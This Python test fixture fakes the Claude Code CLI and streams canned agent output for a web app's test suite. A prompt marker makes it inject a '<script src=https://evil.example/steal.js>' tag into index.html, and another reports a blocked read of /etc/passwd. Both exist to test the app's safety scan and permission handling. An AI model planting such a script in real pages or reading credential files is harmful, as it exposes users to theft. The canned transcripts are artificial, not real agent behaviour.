#!/usr/bin/env python3
"""A stand-in for the Claude Code CLI, used by the test suite. It never calls a model.

It answers like the real CLI:
  --help                         prints help text that names the model aliases
  -p … --output-format json      a model check (used by POST /api/models/check)
  -p … --output-format stream-json   an agent run: streams init, a Write tool use, a text reply and a result

Markers inside the prompt choose what happens during an agent run:
  [[fail]]          the result is an error
  [[fail-once]]     fails the first time in this folder, succeeds afterwards (to test Continue)
  [[crash]]         exits with "not logged in" on stderr
  [[hang]]          sleeps 60 s (to test AGENT_TIMEOUT)
  [[slow]]          sleeps 2.5 s before finishing (to test stop / busy)
  [[escape]]        reports a blocked read of /etc/passwd (a permission denial)
  [[inject-script]] writes an external <script> into index.html (to test the safety scan)

Every call is appended to $FAKE_CLAUDE_LOG as one JSON line: {"argv": [...], "cwd": "..."}.
"""

import json
import os
import re
import sys
import time
import uuid
from pathlib import Path

args = sys.argv[1:]


def arg(name):
    return args[args.index(name) + 1] if name in args and args.index(name) + 1 < len(args) else None


if os.environ.get("FAKE_CLAUDE_LOG"):
    with open(os.environ["FAKE_CLAUDE_LOG"], "a") as f:
        f.write(json.dumps({"argv": args, "cwd": os.getcwd()}) + "\n")

if "--help" in args:
    print("Usage: claude [options] [command] [prompt]\n\n"
          "  --model <model>   Model for the current session. Provide\n"
          "                    an alias for the latest model (e.g.\n"
          "                    'fable', 'opus', or 'sonnet') or a\n"
          "                    model's full name.\n")
    sys.exit(0)

prompt = arg("-p") or ""
model = arg("--model") or "default"
fmt = arg("--output-format")

if fmt == "json":                                    # model check
    if "bad" in model:
        print(f'[claude-code:unrecognized_model] {{"model":"{model}"}}', file=sys.stderr)
        print(json.dumps({"is_error": False, "result": "", "total_cost_usd": 0, "modelUsage": {}}))
    else:
        print(json.dumps({"is_error": False, "result": "OK", "total_cost_usd": 0.0001,
                          "modelUsage": {f"claude-{model}-resolved": {}}}))
    sys.exit(0)


def out(obj):
    print(json.dumps(obj), flush=True)


role = arg("--append-system-prompt") or ""
m = re.search(r"You are the (.+?) agent", role)
agent = m.group(1) if m else "Some"
out({"type": "system", "subtype": "init", "model": f"claude-{model}-test"})

if "[[crash]]" in prompt:
    print("Error: you are not logged in. Please run /login", file=sys.stderr)
    sys.exit(1)
if "[[hang]]" in prompt:
    time.sleep(60)
if "[[slow]]" in prompt:
    time.sleep(2.5)


def result(text, is_error=False, denials=()):
    out({"type": "result", "subtype": "error" if is_error else "success", "is_error": is_error, "result": text,
         "total_cost_usd": 0.0123, "num_turns": 3, "duration_api_ms": 1500,
         "usage": {"input_tokens": 100, "cache_read_input_tokens": 50, "output_tokens": 20},
         "permission_denials": list(denials)})


if "[[fail-once]]" in prompt and not Path(".failed-once").exists():
    Path(".failed-once").write_text("x")
    result("Simulated failure for the test.", is_error=True)
    sys.exit(0)
if "[[fail]]" in prompt:
    result("Simulated failure for the test.", is_error=True)
    sys.exit(0)

# a normal step: append a line to index.html with a Write tool use
tid = "toolu_" + uuid.uuid4().hex[:12]
page = Path("index.html")
content = (page.read_text() if page.exists() else "<!doctype html><title>Test</title>\n") + f"<p>{agent} was here</p>\n"
if "[[inject-script]]" in prompt:
    content += '<script src="https://evil.example/steal.js"></script>\n'
out({"type": "assistant", "message": {"content": [{"type": "tool_use", "id": tid, "name": "Write",
                                                   "input": {"file_path": str(page.resolve()), "content": content}}]}})
page.write_text(content)
out({"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": tid, "content": "ok"}]}})
out({"type": "assistant", "message": {"content": [{"type": "text", "text": f"{agent} agent: did my step."}]}})
denials = [{"tool_name": "Read", "tool_use_id": "toolu_x", "tool_input": {"file_path": "/etc/passwd"}}] if "[[escape]]" in prompt else []
result(f"{agent} agent: did my step.", denials=denials)
